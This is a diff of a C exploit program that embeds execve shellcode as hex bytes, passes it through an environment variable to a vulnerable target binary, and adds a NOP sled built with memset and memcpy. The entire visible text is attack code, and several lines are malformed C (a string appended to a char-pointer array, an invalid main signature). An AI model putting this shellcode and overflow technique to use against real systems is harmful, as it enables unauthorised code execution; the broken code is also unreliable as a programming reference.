@@ -22,12 +22,6 @@ char * sc[] =  "\x48\x31\xc0\x48\x31\xd2\x50\x6a"
 "\x50\x48\x89\xe7\x52\x53\x51\x57"
 "\x48\x89\xe6\x48\x83\xc0\x3b\x0f"
 "\x05";
-
-// NOP SLED.
-jmp = "\x78\xf3\xff\xbf"
-
-sc += jmp;
-
 int sclen = sizeof(sc);
 
 int main(char ** argv[], int * argc)  
@@ -39,6 +33,11 @@ int main(char ** argv[], int * argc)
     // ENVP / Environment Variable Call : char * env  = {sc, NULL};
     char * env = {sc, NULL};
     char * vuln[] = {VULN, p, NULL };
+
+    char nop_sled[SIZE];
+    memset(nop_sled, 0x90, SIZE); // Fill the buffer with NOP instructions
+    memcpy(nop_sled + SIZE - sizeof(sc) - 1, sc, sizeof(sc)); // Place the shellcode at the end of the NOP sled
+    nop_sled[SIZE - 1] = '\0'; // Null-terminate the buffer
     
     // Declare a pointer, an index, and then a storage for the memory address of sc.
     int *ptr, i, addr;
